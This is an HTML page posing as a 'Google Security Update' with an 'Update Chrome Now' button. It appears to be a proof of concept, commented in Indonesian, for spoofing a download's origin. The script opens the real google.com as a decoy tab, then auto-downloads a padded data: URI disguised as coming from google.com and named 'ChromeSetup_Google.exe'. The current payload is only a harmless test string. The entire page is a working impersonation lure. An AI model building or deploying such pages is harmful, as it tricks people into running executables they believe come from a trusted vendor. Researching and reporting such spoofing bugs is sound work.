<!DOCTYPE html>
<html>
<head>
    <title>Google Security Update</title>
</head>
<body style="font-family: Arial; text-align: center; padding-top: 50px;">
    <h2>Google Desktop Service</h2>
    <button id="trigger" style="padding: 15px 30px; cursor: pointer;">Update Chrome Now</button>

    <script>
        document.getElementById('trigger').onclick = function() {
            // Payload Abhishek Kumar versi PC
            const padding = "B".repeat(250); 
            const payload = "data://google.com/application/octet-stream;" + padding + ",base64,ZXN0dGVzdGVzdHRlc3Q=";
            
            // Trik: Buka Google asli dulu
            const newWindow = window.open("https://www.google.com", "_blank");

            // Tembak download setelah tab baru fokus
            setTimeout(() => {
                const a = document.createElement('a');
                a.href = payload;
                a.download = "ChromeSetup_Google.exe"; // Pake .exe biar valuenya tinggi
                document.body.appendChild(a);
                a.click();
                
                console.log("Payload sent to PC Chrome.");
            }, 800);
        };
    </script>
</body>
